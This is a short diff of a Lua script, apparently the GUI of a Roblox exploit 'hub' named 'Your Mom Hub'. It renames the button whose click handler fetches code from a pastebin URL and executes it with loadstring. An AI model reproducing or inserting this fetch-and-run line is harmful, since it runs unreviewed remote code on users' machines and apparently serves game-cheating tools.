@@ -268,7 +268,7 @@ YourMomHubv02.Font = Enum.Font.Creepster
 YourMomHubv02.Text = "Your Mom Hub"
 YourMomHubv02.TextColor3 = Color3.fromRGB(85, 0, 0)
 YourMomHubv02.TextSize = 44.000
-Piggy.MouseButton1Down:connect(function()
+YourMomHubv02.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/XTsRjZw6", true))()
 end)
 
